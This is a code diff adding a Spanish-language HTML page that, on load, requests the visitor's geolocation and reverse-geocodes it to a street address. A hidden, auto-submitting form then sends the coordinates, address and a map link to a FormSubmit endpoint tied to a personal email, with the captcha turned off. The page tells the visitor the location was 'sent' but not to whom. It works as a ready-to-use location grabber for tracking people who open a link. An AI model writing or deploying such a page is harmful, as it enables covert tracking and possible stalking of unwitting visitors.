@@ -1,74 +1,134 @@
-<script>
-  async function enviarUbicacion() {
-    const estado = document.getElementById("estado");
-    const latSpan = document.getElementById("latitud");
-    const lonSpan = document.getElementById("longitud");
-    const dirSpan = document.getElementById("direccion");
-    const mapaLink = document.getElementById("mapa");
-
-    // Si ya se enviaron y hay datos guardados, los mostramos
-    if (localStorage.getItem("ubicacionEnviada")) {
-      latSpan.textContent = localStorage.getItem("lat");
-      lonSpan.textContent = localStorage.getItem("lon");
-      dirSpan.textContent = localStorage.getItem("direccion");
-      mapaLink.href = localStorage.getItem("mapaURL");
-      mapaLink.textContent = "📍 Ver en Google Maps";
-      estado.textContent = "✅ Ubicación ya enviada.";
-      return;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Ubicación detectada</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #eef2f3;
+      padding: 30px;
+      text-align: center;
     }
-
-    if (!navigator.geolocation) {
-      estado.textContent = "❌ Geolocalización no disponible.";
-      return;
+    h1 {
+      color: #333;
     }
+    .dato {
+      margin: 10px 0;
+      font-size: 1.1em;
+      color: #444;
+    }
+    .enlace {
+      margin-top: 15px;
+      font-size: 1.1em;
+      color: #0077cc;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 1em;
+      background-color: #0077cc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005fa3;
+    }
+  </style>
+</head>
+<body>
+  <h1>📍 Tu ubicación detectada</h1>
+  <div id="estado" class="dato">Cargando...</div>
+  <div class="dato">Latitud: <span id="latitud">-</span></div>
+  <div class="dato">Longitud: <span id="longitud">-</span></div>
+  <div class="dato">Dirección: <span id="direccion">-</span></div>
+  <div class="enlace"><a id="mapa" href="#" target="_blank"></a></div>
 
-    estado.textContent = "📡 Obteniendo ubicación...";
+  <button onclick="reiniciarEnvio()">🔄 Reintentar envío</button>
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+  <form action="https://formsubmit.co/elsanchezok@yahoo.com" method="POST" id="formulario" style="display:none;">
+    <input type="hidden" name="Latitud" id="latitudInput">
+    <input type="hidden" name="Longitud" id="longitudInput">
+    <input type="hidden" name="Dirección" id="direccionInput">
+    <input type="hidden" name="Google Maps" id="mapaInput">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://elsanchezok.github.io/">
+  </form>
 
-      latSpan.textContent = lat;
-      lonSpan.textContent = lon;
+  <script>
+    async function enviarUbicacion() {
+      const estado = document.getElementById("estado");
+      const latSpan = document.getElementById("latitud");
+      const lonSpan = document.getElementById("longitud");
+      const dirSpan = document.getElementById("direccion");
+      const mapaLink = document.getElementById("mapa");
 
-      const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
-      try {
-        const response = await fetch(url);
-        const data = await response.json();
-        const direccion = data.display_name || "Dirección no disponible";
-        const mapaURL = `https://www.google.com/maps?q=${lat},${lon}`;
-
-        dirSpan.textContent = direccion;
-        mapaLink.href = mapaURL;
+      if (localStorage.getItem("ubicacionEnviada")) {
+        latSpan.textContent = localStorage.getItem("lat");
+        lonSpan.textContent = localStorage.getItem("lon");
+        dirSpan.textContent = localStorage.getItem("direccion");
+        mapaLink.href = localStorage.getItem("mapaURL");
         mapaLink.textContent = "📍 Ver en Google Maps";
-
-        // Guardar en localStorage
-        localStorage.setItem("ubicacionEnviada", "true");
-        localStorage.setItem("lat", lat);
-        localStorage.setItem("lon", lon);
-        localStorage.setItem("direccion", direccion);
-        localStorage.setItem("mapaURL", mapaURL);
-
-        // Enviar por FormSubmit
-        document.getElementById("latitudInput").value = lat;
-        document.getElementById("longitudInput").value = lon;
-        document.getElementById("direccionInput").value = direccion;
-        document.getElementById("mapaInput").value = mapaURL;
-
-        estado.textContent = "✅ Ubicación enviada correctamente.";
-        document.getElementById("formulario").submit();
-      } catch (error) {
-        estado.textContent = "❌ Error al obtener la dirección.";
+        estado.textContent = "✅ Ubicación ya enviada.";
+        return;
       }
-    }, () => {
-      estado.textContent = "❌ No se pudo obtener la ubicación.";
-    });
-  }
 
-  function reiniciarEnvio() {
-    localStorage.clear();
-    location.reload();
-  }
+      if (!navigator.geolocation) {
+        estado.textContent = "❌ Geolocalización no disponible.";
+        return;
+      }
 
-  window.onload = enviarUbicacion;
-</script>
+      estado.textContent = "📡 Obteniendo ubicación...";
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        latSpan.textContent = lat;
+        lonSpan.textContent = lon;
+
+        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
+        try {
+          const response = await fetch(url);
+          const data = await response.json();
+          const direccion = data.display_name || "Dirección no disponible";
+          const mapaURL = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          dirSpan.textContent = direccion;
+          mapaLink.href = mapaURL;
+          mapaLink.textContent = "📍 Ver en Google Maps";
+
+          localStorage.setItem("ubicacionEnviada", "true");
+          localStorage.setItem("lat", lat);
+          localStorage.setItem("lon", lon);
+          localStorage.setItem("direccion", direccion);
+          localStorage.setItem("mapaURL", mapaURL);
+
+          document.getElementById("latitudInput").value = lat;
+          document.getElementById("longitudInput").value = lon;
+          document.getElementById("direccionInput").value = direccion;
+          document.getElementById("mapaInput").value = mapaURL;
+
+          estado.textContent = "✅ Ubicación enviada correctamente.";
+          document.getElementById("formulario").submit();
+        } catch (error) {
+          estado.textContent = "❌ Error al obtener la dirección.";
+        }
+      }, () => {
+        estado.textContent = "❌ No se pudo obtener la ubicación.";
+      });
+    }
+
+    function reiniciarEnvio() {
+      localStorage.clear();
+      location.reload();
+    }
+
+    window.onload = enviarUbicacion;
+  </script>
+</body>
+</html>
